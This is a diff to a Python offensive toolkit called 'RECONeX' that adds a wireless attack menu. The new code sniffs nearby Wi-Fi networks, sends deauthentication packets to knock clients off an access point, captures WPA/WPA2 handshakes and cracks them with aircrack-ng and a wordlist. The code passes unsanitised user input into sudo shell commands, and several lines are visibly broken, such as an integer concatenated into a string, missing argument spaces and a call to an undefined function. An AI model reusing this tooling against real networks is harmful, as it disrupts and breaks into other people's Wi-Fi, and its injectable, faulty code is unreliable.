@@ -345,6 +345,14 @@ def IGoperation():
         banner_grab()
     elif choose == '7':
         grandoperation()
+    elif choose == 'ls':
+        os.system("ls")
+        time.sleep(5)
+        IGoperation()
+    elif choose == 'pwd':
+        os.system("pwd")
+        time.sleep(5)
+        IGoperation()
     else:
         print("Enter Valid Input")
         IGoperation()
@@ -517,6 +525,18 @@ def MITMoperation():
             wirelessexp()
         elif choose == 'ifconfig':
             os.system("ifconfig")
+            time.sleep(5)
+            MITMoperation()
+        elif choose == 'ls':
+            os.system("ls")
+            time.sleep(5)
+            MITMoperation()
+        elif choose == 'pwd':
+            os.system("pwd")
+            time.sleep(5)
+            MITMoperation()
+        elif choose == 'iwconfig':
+            os.system("iwconfig")
             time.sleep(5)
             MITMoperation()
         elif choose == '5':
@@ -1114,6 +1134,22 @@ def ExploitOperation():
         elif choice == 'clear':
             os.system('clear')
             ExploitOperation()
+        elif choice == 'ifconfig':
+            os.system("ifconfig")
+            time.sleep(5)
+            ExploitOperation()
+        elif choice == 'ls':
+            os.system("ls")
+            time.sleep(5)
+            ExploitOperation()
+        elif choice == 'pwd':
+            os.system("pwd")
+            time.sleep(5)
+            ExploitOperation()
+        elif choice == 'iwconfig':
+            os.system("iwconfig")
+            time.sleep(5)
+            ExploitOperation()
         elif choice == 'pwd':
             os.system('pwd')
             ExploitOperation()
@@ -1152,85 +1188,90 @@ def interface_scan():
         wirelessexp()
 
 def interface_configure():
-    print("\n [*] --> Updating your system, please wait ....  \n")
-    lines()
-    subprocess.call(['apt', 'update', '-y'], stdout=subprocess.DEVNULL)
-    lines()
+    try:
+        print("\n [*] --> Updating your system, please wait ....  \n")
+        lines()
+        subprocess.call(['sudo','apt', 'update', '-y'], stdout=subprocess.DEVNULL)
+        lines()
 
-    print("\n [*] --> Installing build-essentials, Please wait ....  \n")
-    lines()
-    subprocess.call(['apt', 'install', 'build-essential', '-y'], stdout=subprocess.DEVNULL)
-    lines()
-    print("\n [*] --> Installing bc, Won't take too long :) ....  \n")
-    lines()
-    subprocess.call(['apt', 'install', 'bc', '-y'], stdout=subprocess.DEVNULL)
-    lines()
-    print("\n [*] --> Installing libelf-dev, Please wait ....  \n")
-    lines()
-    subprocess.call(['apt', 'install', 'libelf-dev', '-y'], stdout=subprocess.DEVNULL)
-    lines()
-    print("\n [*] --> Installing the required linux-headers, Please wait .....  \n")
-    lines()
-    subprocess.call("apt install linux-headers-$(uname -r)", shell=True)
-    lines()
-    print("\n [*] --> Removing \"r8188eu.ko module\"  \n")
-    subprocess.call(['rmmod', 'r8188eu.ko'], stdout=subprocess.DEVNULL)
-    print("\n [*] --> Git cloning \"rtl8188eus\"  \n")
-    lines()
-    unamer = subprocess.check_output(['uname','-r'])
-    unamerr = re.search(r"\d.\d\d", str(unamer))
-    if unamerr is None:
-        subprocess.call(['git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
-    elif unamerr.group(0) >= "5.15":
-        subprocess.call(['git', 'clone', 'https://github.com/drygdryg/rtl8188eus.git'], stdout=subprocess.DEVNULL)
-    else:
-        subprocess.call(['git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
-    lines()
-    print("\n [*] --> Installing dkms, please wait ..... ")
-    print(" [Info] --> If dkms installation timed out after 30 seconds, the tool would exit with error and you need to upgrade your Kali with the \"sudo apt upgrade -y\" CL \n")
-    subprocess.call(['apt', 'install', 'dkms'], stdout=subprocess.DEVNULL, timeout=30)
-    lines()
-    print("\n [*] --> Done installing dkms. proceeding further ....  \n")
-    os.chdir("rtl8188eus")
-    lines()
-    print("\n [*] --> Echoing \"blacklist r8188eu.ko\" to \"realtek.conf\"  \n")
-    subprocess.call("echo \"blacklist r8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
-    subprocess.call("echo \"blacklist 8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
-    lines()
-    print("\n [*] --> Running Make command, Will take few minutes, please wait and ignore the upcoming errors and warnings ......  \n")
-    lines()
-    subprocess.call(['make'], stdout=subprocess.DEVNULL)
-    lines()
-    print("\n [*] --> Running Make Install command  \n")
-    lines()
-    subprocess.call(['make', 'install'], stdout=subprocess.DEVNULL)
-    lines()
-    print("\n [*] --> Running \"modprobe 8188eu\"  \n")
-    lines()
-    subprocess.call("modprobe 8188eu", shell=True)
-    iwco = subprocess.check_output(['iwconfig'])
-    Auto_check = re.search(r"Mode:Auto", str(iwco))
-    if not Auto_check:
+        print("\n [*] --> Installing build-essentials, Please wait ....  \n")
         lines()
-        print("\n [Warning] --> The WiFi adapter mode is not Auto or it is just missing. ")
-        print(" [Instruction] --> UnPlug and plug in your WiFi USB adapter, wait for few seconds then run the tool again with root - Bye bye :)   \n")
+        subprocess.call(['sudo','apt', 'install', 'build-essential', '-y'], stdout=subprocess.DEVNULL)
         lines()
-        wirelessexp()
-    if Auto_check is not None:
+        print("\n [*] --> Installing bc, Won't take too long :) ....  \n")
         lines()
-        print("\n [Congrats] --> The WiFi USB adapter is successfully configured \n")
-        asking = input("\n [Permission] --> Would you like to set your WiFi USB adapter to Monitor mode now?  [yes / no] ")
+        subprocess.call(['sudo','apt', 'install', 'bc', '-y'], stdout=subprocess.DEVNULL)
         lines()
-        if asking.lower() == 'y' or asking.lower() == 'yes':
-            tp_set()
-        elif asking.lower() == 'n' or asking.lower() == 'no':
-            lines()
-            print("\n [Info] --> Now your adapter is just set to Auto mode - Bye Bye :) \n")
-            TheEnd()
+        print("\n [*] --> Installing libelf-dev, Please wait ....  \n")
+        lines()
+        subprocess.call(['sudo','apt', 'install', 'libelf-dev', '-y'], stdout=subprocess.DEVNULL)
+        lines()
+        print("\n [*] --> Installing the required linux-headers, Please wait .....  \n")
+        lines()
+        subprocess.call(" sudo apt install linux-headers-$(uname -r)", shell=True)
+        lines()
+        print("\n [*] --> Removing \"r8188eu.ko module\"  \n")
+        subprocess.call(['sudo','rmmod', 'r8188eu.ko'], stdout=subprocess.DEVNULL)
+        print("\n [*] --> Git cloning \"rtl8188eus\"  \n")
+        lines()
+        unamer = subprocess.check_output(['uname','-r'])
+        unamerr = re.search(r"\d.\d\d", str(unamer))
+        if unamerr is None:
+            subprocess.call(['sudo','git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
+        elif unamerr.group(0) >= "5.15":
+            subprocess.call(['sudo','git', 'clone', 'https://github.com/drygdryg/rtl8188eus.git'], stdout=subprocess.DEVNULL)
         else:
+            subprocess.call(['sudo','git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
+        lines()
+        print("\n [*] --> Installing dkms, please wait ..... ")
+        print(" [Info] --> If dkms installation timed out after 30 seconds, the tool would exit with error and you need to upgrade your Kali with the \"sudo apt upgrade -y\" CL \n")
+        subprocess.call(['sudo','apt', 'install', 'dkms'], stdout=subprocess.DEVNULL, timeout=30)
+        lines()
+        print("\n [*] --> Done installing dkms. proceeding further ....  \n")
+        os.chdir("rtl8188eus")
+        lines()
+        print("\n [*] --> Echoing \"blacklist r8188eu.ko\" to \"realtek.conf\"  \n")
+        subprocess.call("sudo echo \"blacklist r8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
+        subprocess.call("sudo echo \"blacklist 8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
+        lines()
+        print("\n [*] --> Running Make command, Will take few minutes, please wait and ignore the upcoming errors and warnings ......  \n")
+        lines()
+        subprocess.call(['sudo','make'], stdout=subprocess.DEVNULL)
+        lines()
+        print("\n [*] --> Running Make Install command  \n")
+        lines()
+        subprocess.call(['sudo','make', 'install'], stdout=subprocess.DEVNULL)
+        lines()
+        print("\n [*] --> Running \"modprobe 8188eu\"  \n")
+        lines()
+        subprocess.call("sudo modprobe 8188eu", shell=True)
+        iwco = subprocess.check_output(['iwconfig'])
+        Auto_check = re.search(r"Mode:Auto", str(iwco))
+        if not Auto_check:
             lines()
-            print("\n [Warning] --> Invalid Entry. [Your interface is just set to Auto mode] - Exiting .....\n")
+            print("\n [Warning] --> The WiFi adapter mode is not Auto or it is just missing. ")
+            print(" [Instruction] --> UnPlug and plug in your WiFi USB adapter, wait for few seconds then run the tool again with root - Bye bye :)   \n")
+            lines()
             wirelessexp()
+        if Auto_check is not None:
+            lines()
+            print("\n [Congrats] --> The WiFi USB adapter is successfully configured \n")
+            asking = input("\n [Permission] --> Would you like to set your WiFi USB adapter to Monitor mode now?  [yes / no] ")
+            lines()
+            if asking.lower() == 'y' or asking.lower() == 'yes':
+                enable_monitor()
+            elif asking.lower() == 'n' or asking.lower() == 'no':
+                lines()
+                print("\n [Info] --> Now your adapter is just set to Auto mode - Bye Bye :) \n")
+                TheEnd()
+            else:
+                lines()
+                print("\n [Warning] --> Invalid Entry. [Your interface is just set to Auto mode] - Exiting .....\n")
+                wirelessexp()
+
+    except KeyboardInterrupt:
+        print("Ctrl+C pressed......")
+        wirelessexp()
 
 def lines():
     print("-------------------------------------------------------------------------------------------------------")
@@ -1247,24 +1288,172 @@ def getinterf():
     else:
         lines()
         print(" [Warning] --> Couldn't read your adapter, please make sure that your adapter is plugged in - Exiting .......")
-        wirelessexp()
+
 def enable_monitor():
     interf = getinterf()
-    subprocess.call(['ifconfig', interf, 'down'])
-    subprocess.call("airmon-ng check kill", shell=True)
-    subprocess.call(['iwconfig', interf, 'mode', 'monitor'])
-    subprocess.call(['ifconfig', interf, 'up'])
-    tp_check()
-def tp_check():
+    subprocess.call(['sudo','ifconfig', interf, 'down'])
+    subprocess.call("sudo airmon-ng check kill", shell=True)
+    subprocess.call(['sudo','iwconfig', interf, 'mode', 'monitor'])
+    subprocess.call(['sudo','ifconfig', interf, 'up'])
     interff = getinterf()
     iwcon = subprocess.getoutput("iwconfig"+interff)
     iwcon_Mcheck = re.search(r"Monitor",str(iwcon))
     if iwcon_Mcheck is not None:
         lines()
         print("\n [Congrats] --> You WiFi USB adapter has been set to monitor mode :) :) \n")
+        wirelessexp()
+
+ifconfig_outp = subprocess.getoutput("iwconfig")
+interfs = subprocess.getoutput('iwconfig |grep WIFI@REALTEK')
+chwlannn = re.search(r"Mode:Monitor", str(ifconfig_outp))
+chwlan = re.search(r"Mode:Managed", str(ifconfig_outp))
+chwlann = re.search(r"Mode:Auto", str(ifconfig_outp))
+chifasso = re.search(r"unassociated", str(ifconfig_outp))
+
+def airodump():
+    print("*************************")
+    print("*  Scan Wi-Fi Networks  *")
+    print("*************************")
+    if interfs and chwlannn:
+        interfaceadapter = input(colored("## Enter your choice:-", 'yellow'))
+        try:
+            if interfaceadapter == 'wlan0':
+                os.system("sudo airodump-ng" + "\t" + interfaceadapter)
+                airodump_again()
+            elif interfaceadapter == '':
+                print("\n")
+                print(colored("\tNull Value Detected!!!", 'blue'))
+                print("\n")
+                airodump()
+            else:
+                print("Enter from available WLAN interfaces")
+
+        except KeyboardInterrupt:
+            print("Process Aborted!!!!")
+            airodump_again()
+
+    elif interfs and chwlan :
+        print("\nTP-Link adapter is in Managed Mode")
+        print("\n Enable Monitor Mode TO sniff wifi networks")
+        time.sleep(3)
+        wirelessexp()
+    elif interfs and chwlann :
+        print("\nTP-Link adapter is in Auto Mode")
+        print("\n Enable Monitor Mode TO sniff wifi networks")
+        time.sleep(3)
+        wirelessexp()
+    elif interfs:
+        print("\n Please enable Monitor Mode")
+        time.sleep(3)
+        wirelessexp()
+    else:
+        print("\n Didn't detect any WLAN adapter")
+        print("\n\n Please Connect your WLAN adapter for WI-FI Sniffing.")
+        wirelessexp()
+
+def airodump_again():
+    choice = input("Need Another Scan(y/n):- ")
+    if choice == 'y':
+        airodump()
+    elif choice == 'n':
+        print("Sniffing Terminated.......")
+        time.sleep(2)
+        wirelessexp()
+    else:
+        print("Enter y or n:--")
+        airodump_again()
+
+def aireplay():
+    print("***********************************")
+    print("*  Capture HandShakes (WPA/WPA2)  *")
+    print("***********************************")
+    if interfs and chwlannn:
+        try:
+            AP_mac_address = input(colored("## Enter access point's MAC address:-", 'yellow'))
+            target_mac_address = input(colored("## Enter target's MAC address:-", 'yellow'))
+            interfaceadapter = input(colored("## Enter adapter name:-", 'yellow'))
+            no_of_deauth_packets = int(input(colored("## Enter no. of deauth packets:-", 'yellow')))
+            if interfaceadapter == 'wlan0':
+                os.system("sudo aireplay-ng  --deauth " + no_of_deauth_packets + "-a" + AP_mac_address +"-c " + target_mac_address + "\t" + interfaceadapter)
+                lines()
+                aireplay_again()
+            elif interfaceadapter == '':
+                print("\n")
+                print(colored("\tNull Value Detected!!!", 'blue'))
+                print("\n")
+                aireplay()
+            else:
+                print("Enter from available WLAN interfaces")
+
+        except KeyboardInterrupt:
+                aireplay_again()
+
+    elif interfs and chwlan:
+        print("\nTP-Link adapter is in Managed Mode")
+        print("\n Enable MOnitor mode for deauth attack")
+        time.sleep(2)
+        wirelessexp()
+    elif interfs and chwlann:
+        print("\nTP-Link adapter is in Auto Mode")
+        print("\n Enable MOnitor mode for deauth attack")
+        time.sleep(2)
+        wirelessexp()
+    elif interfs:
+        print("\n Print enable Monitor Mode")
+        wirelessexp()
+    else:
+        print("\n Didn't detect any WLAN adapter")
+        print("\n Please Connect your WLAN adapter for WI-FI cracking.")
+
+def aireplay_again():
+    choice = input("Want to capture another handshake(y/n):- ")
+    if choice == 'y':
+        aireplay()
+    elif choice == 'n':
+        wirelessexp()
+    else:
+        print("Enter y or n:--")
+        aireplay_again()
+def lines():
+    print("***************************************************************************")
+    print("\n")
+
+def aircrack():
+    print("***********************************")
+    print("*   Crack Passwords (WPA/WPA2)    *")
+    print("***********************************")
+    wpawpa2()
+
+def wpawpa2():
+    wordlist_for_cracking = input("Enter The path of wordlist:-\t ")
+    capture_handshake_file = input("Enter the path of captured handshake file:-\t")
+    checkfile = subprocess.getoutput('ls |grep' + capture_handshake_file)
+    time.sleep(2)
+    print("Sequencing the values.....")
+    time.sleep(2)
+    try:
+        if checkfile:
+            os.system("sudo aircrack-ng " + "\t" + "-w" + "\t" + wordlist_for_cracking + "\t" + capture_handshake_file)
+            wpa_scan_again()
+        else:
+            print("Given handshake file not exist!! Check again")
+            wpa()
+
+    except KeyboardInterrupt:
+        print("Ctrl + C pressed.....")
+        exit()
+def wpa_scan_again():
+    choice = input("Need Another crack session(y/n):- ")
+    if choice == 'y':
+        wpawpa2()
+    elif choice == 'n':
+        print("process Terminated.......")
+        wirelessexp()
+    else:
+        print("Enter y or n:--")
+        wpa_scan_again()
 def wirelessexp():
     os.system("clear")
-
     f = Figlet(font='slant', width=200)
     print(colored(f.renderText('RECONeX'), 'green'))
     print('----------------------------------------------------')
@@ -1276,6 +1465,7 @@ def wirelessexp():
     time.sleep(2)
     choose = 0
     while (choose != '5'):
+        print(colored("[HIGHLY RECOMMENDED ------> USe Multiple Terminals to Capture WPA/WPA2 HANDSHAKES ]", 'green'))
         time.sleep(1)
         print("-----------------------------------------------------")
         print("|             Wireless Exploitation Menu            |")
@@ -1283,7 +1473,10 @@ def wirelessexp():
         print("{1} Available Interfaces                            |")
         print("{2} Configure the interface (Only supports TP-LInk) |")
         print("{3} Enable Monitor Mode                             |")
-        print("{4} Exit from Attack Mode                           |")
+        print("{4} Sniff Wi-Fi Signals Neaby                       |")
+        print("{5} Deauth & Capture WPA/WPA2 handshakes            |")
+        print("{6} Crack WPA/WPA2 Passwords                        |")
+        print("{7} Exit from Attack Mode                           |")
         print("-----------------------------------------------------")
         choose = input("Enter your choice:-")
         if choose == '1':
@@ -1292,12 +1485,35 @@ def wirelessexp():
             interface_configure()
         elif choose == '3':
             enable_monitor()
+        elif choose == '4':
+            airodump()
+        elif choose == '5':
+            aireplay()
+        elif choose == '6':
+            aircrack()
         elif choose == 'iwconfig':
             os.system("iwconfig")
             time.sleep(3)
             wirelessexp()
-        elif choose == '4':
+        elif choose == 'ifconfig':
+            os.system("ifconfig")
+            time.sleep(5)
+            wirelessexp()
+        elif choose == 'clear' :
+            os.system("clear")
+            time.sleep(2)
+            wirelessexp()
+        elif choose == 'ls':
+            os.system("ls")
+            time.sleep(5)
+            wirelessexp()
+        elif choose == 'pwd':
+            os.system("pwd")
+            time.sleep(5)
+            wirelessexp()
+        elif choose == '7':
             print(colored("Wireless Attack [MODE OFF]", 'green'))
+            os.system("sudo service NetworkManager restart")
             MITMoperation()
         else:
             print("Enter Valid Input")
